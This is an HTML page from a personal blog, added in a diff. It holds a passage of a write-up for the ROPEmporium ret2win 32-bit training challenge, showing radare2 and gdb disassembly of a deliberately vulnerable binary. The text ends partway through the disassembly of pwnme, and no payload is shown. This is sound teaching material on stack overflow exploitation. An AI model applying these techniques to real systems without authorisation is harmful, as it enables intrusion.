@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.115.4">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="cavefxa" />
+  <meta property="og:url" content="https://cavefxa.com/archived/ret2win32/" />
+  <link rel="canonical" href="https://cavefxa.com/archived/ret2win32/" /><link rel="alternate" type="application/atom+xml" href="https://cavefxa.comindex.xml" title="cavefxa">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/cavefxa.com"
+      },
+      "articleSection" : "archived",
+      "name" : "ROPEmporium: ret2win 32-bit",
+      "headline" : "ROPEmporium: ret2win 32-bit",
+      "description" : "Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools\n[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits.",
+      "inLanguage" : "en-US",
+      "author" : "cavefxa",
+      "creator" : "cavefxa",
+      "publisher": "cavefxa",
+      "accountablePerson" : "cavefxa",
+      "copyrightHolder" : "cavefxa",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 14:20:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 14:20:00 \u002b0200 CEST",
+      "url" : "https:\/\/cavefxa.com\/archived\/ret2win32\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>ROPEmporium: ret2win 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: ret2win 32-bit" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools
+[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits." />
+  <meta name="description" content="Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools
+[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:900px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}pre{.l { color: #000000 !important; }}.markdown-body code{padding:.2em .4em;font-size:85%;color:#43494d;border-radius:6px}.highlight pre{background-color:#fff!important}.markdown-body pre>code{padding:0;font-size:100%;color:#171b1f;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="cavefxa">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefxa</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/index.xml" target="_blank">RSS</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: ret2win 32-bit</h1>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-return-to-win-ret2win-on-ropemporium">Writeup of return to win [Ret2win] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly and disassembling tools</p>
+<p>[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits. ((4*2)*8)=64-bit]</p>
+<hr>
+<p>Let&rsquo;s start by disassembling the binary with radare2&rsquo;s visual mode. I started by passing aaa to radare2, to analyze the binary and then went into visual mode.
+If you&rsquo;re unsure about how this works, look up a radare2 tutorial on YouTube.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>&gt;* 0x08048430   50 entry0                                   
+</span></span><span style="display:flex;"><span>   0x08048463    4 fcn.08048463                             
+</span></span><span style="display:flex;"><span>   0x080483f0    6 sym.imp.__libc_start_main            
+</span></span><span style="display:flex;"><span>   0x08048490   41 sym.deregister_tm_clones                
+</span></span><span style="display:flex;"><span>   0x080484d0   54 sym.register_tm_clones                 
+</span></span><span style="display:flex;"><span>   0x08048510   31 entry.fini0                                 
+</span></span><span style="display:flex;"><span>   0x08048540    6 entry.init0                        
+</span></span><span style="display:flex;"><span>   0x080485ad  127 sym.pwnme                              
+</span></span><span style="display:flex;"><span>   0x08048410    6 sym.imp.memset                          
+</span></span><span style="display:flex;"><span>   0x080483d0    6 sym.imp.puts                             
+</span></span><span style="display:flex;"><span>   0x080483c0    6 sym.imp.printf                       
+</span></span><span style="display:flex;"><span>   0x080483b0    6 sym.imp.read                          
+</span></span><span style="display:flex;"><span>   0x0804862c   41 sym.ret2win                           
+</span></span><span style="display:flex;"><span>   0x080483e0    6 sym.imp.system                   
+</span></span><span style="display:flex;"><span>   0x080486c0    2 sym.__libc_csu_fini                   
+</span></span><span style="display:flex;"><span>   0x08048480    4 sym.__x86.get_pc_thunk.bx                
+</span></span><span style="display:flex;"><span>   0x080486c4   20 sym._fini                           
+</span></span><span style="display:flex;"><span>   0x08048660   93 sym.__libc_csu_init                     
+</span></span><span style="display:flex;"><span>   0x08048470    2 sym._dl_relocate_static_pie
+</span></span><span style="display:flex;"><span>   0x08048546  103 main                                     
+</span></span><span style="display:flex;"><span>   0x08048400    6 sym.imp.setvbuf
+</span></span><span style="display:flex;"><span>   0x08048374   35 sym._init 
+</span></span></code></pre></div><p>This is the information I got. I see a sym.ret2win, let&rsquo;s look at that!</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="">┌──────────────────────────────────────────┐</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> [0x804862c]                              <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> 41: sym.ret2win ();                      <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> push ebp                                 <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> mov ebp, esp                             <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> sub esp, 8                               <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> sub esp, 0xc                             <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#00f">const</span> <span style="color:#2b91af">char</span> *s                          <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> ; 0x80487f6                              <span style="">│</span>                                                 
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#a31515">&#34;Well done! Here&#39;s your flag:&#34;</span>         <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> push str.Well_done__Here_s_your_flag:    <span style="">│</span>                                                      
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#2b91af">int</span> puts(<span style="color:#00f">const</span> <span style="color:#2b91af">char</span> *s)                <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> call sym.imp.puts;[oa]                   <span style="">│</span>  <span style="">#</span>Calls puts, which will place the string                                                   
+</span></span><span style="display:flex;"><span><span style="">│</span> add esp, 0x10                            <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> sub esp, 0xc                             <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#00f">const</span> <span style="color:#2b91af">char</span> *string                     <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> ; 0x8048813                              <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#a31515">&#34;/bin/cat flag.txt&#34;</span>                    <span style="">│</span>                                                    
+</span></span><span style="display:flex;"><span><span style="">│</span> push str.bin_cat_flag.txt                <span style="">│</span>  <span style="">#</span>Pushes the string: <span style="color:#a31515">&#34;/bin/cat flag.txt&#34;</span> - Try running this in your terminal                                                 
+</span></span><span style="display:flex;"><span><span style="">│</span> ; <span style="color:#2b91af">int</span> system(<span style="color:#00f">const</span> <span style="color:#2b91af">char</span> *string)         <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> call sym.imp.system;[ob]                 <span style="">│</span>  <span style="">#</span>Syscall system, using the top of the stack as an argument (Here the latest pushed item &amp; top of stack is the string)                                                   
+</span></span><span style="display:flex;"><span><span style="">│</span> add esp, 0x10                            <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> nop                                      <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">│</span> leave                                    <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span>| ret                                      <span style="">│</span>                                                     
+</span></span><span style="display:flex;"><span><span style="">└──────────────────────────────────────────┘</span>  
+</span></span></code></pre></div><p>So somehow if we can return to this function, we&rsquo;ll get the flag. Great!
+Let&rsquo;s look at another function, sym.pwnme (?) That sounds interesting. Let&rsquo;s use gdb(pwndbg) instead this time around. With &ldquo;info functions&rdquo;, or &ldquo;inf fu&rdquo; we can see functions and their addresses.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg&gt; inf fu
+</span></span><span style="display:flex;"><span>All defined functions:
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>0x08048374  _init
+</span></span><span style="display:flex;"><span>0x080483b0  read<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x080483c0  printf<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x080483d0  puts<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x080483e0  system<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x080483f0  __libc_start_main<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x08048400  setvbuf<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x08048410  memset<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x08048420  __gmon_start__<span style="">@</span>plt
+</span></span><span style="display:flex;"><span>0x08048430  _start
+</span></span><span style="display:flex;"><span>0x08048470  _dl_relocate_static_pie
+</span></span><span style="display:flex;"><span>0x08048480  __x86.get_pc_thunk.bx
+</span></span><span style="display:flex;"><span>0x08048490  deregister_tm_clones
+</span></span><span style="display:flex;"><span>0x080484d0  register_tm_clones
+</span></span><span style="display:flex;"><span>0x08048510  __do_global_dtors_aux
+</span></span><span style="display:flex;"><span>0x08048540  frame_dummy
+</span></span><span style="display:flex;"><span>0x08048546  main
+</span></span><span style="display:flex;"><span>0x080485ad  pwnme
+</span></span><span style="display:flex;"><span>0x0804862c  ret2win
+</span></span><span style="display:flex;"><span>0x08048660  __libc_csu_init
+</span></span><span style="display:flex;"><span>0x080486c0  __libc_csu_fini
+</span></span><span style="display:flex;"><span>0x080486c4  _fini
+</span></span></code></pre></div><p>So lets disassemble pwnme</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg&gt; disass pwnme 
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#00f">for</span> function pwnme:
+</span></span><span style="display:flex;"><span>   0x080485ad &lt;+0&gt;: push   ebp
+</span></span><span style="display:flex;"><span>   0x080485ae &lt;+1&gt;: mov    ebp,esp
+</span></span><span style="display:flex;"><span>   0x080485b0 &lt;+3&gt;: sub    esp,0x28
+</span></span><span style="display:flex;"><span>   0x080485b3 &lt;+6&gt;: sub    esp,0x4
+</span></span><span style="display:flex;"><span>   0x080485b6 &lt;+9&gt;: push   0x20
+</span></span><span style="display:flex;"><span>   0x080485b8 &lt;+11&gt;:    push   0x0
+</span></span><span style="display:flex;"><span>   0x080485ba &lt;+13&gt;:    lea    eax,[ebp-0x28]
+</span></span><span style="display:flex;"><span>   0x080485bd &lt;+16&gt;:    push   eax
+</span></span><span style="display:flex;"><span>   0x080485be &lt;+17&gt;:    call   0x8048410 &lt;memset<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x080485c3 &lt;+22&gt;:    add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080485c6 &lt;+25&gt;:    sub    esp,0xc
+</span></span><span style="display:flex;"><span>   0x080485c9 &lt;+28&gt;:    push   0x8048708
+</span></span><span style="display:flex;"><span>   0x080485ce &lt;+33&gt;:    call   0x80483d0 &lt;puts<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x080485d3 &lt;+38&gt;:    add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080485d6 &lt;+41&gt;:    sub    esp,0xc
+</span></span><span style="display:flex;"><span>   0x080485d9 &lt;+44&gt;:    push   0x8048768
+</span></span><span style="display:flex;"><span>   0x080485de &lt;+49&gt;:    call   0x80483d0 &lt;puts<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x080485e3 &lt;+54&gt;:    add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080485e6 &lt;+57&gt;:    sub    esp,0xc
